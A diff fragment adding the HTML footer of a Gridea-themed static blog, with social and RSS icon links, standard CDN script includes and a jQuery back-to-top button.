+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
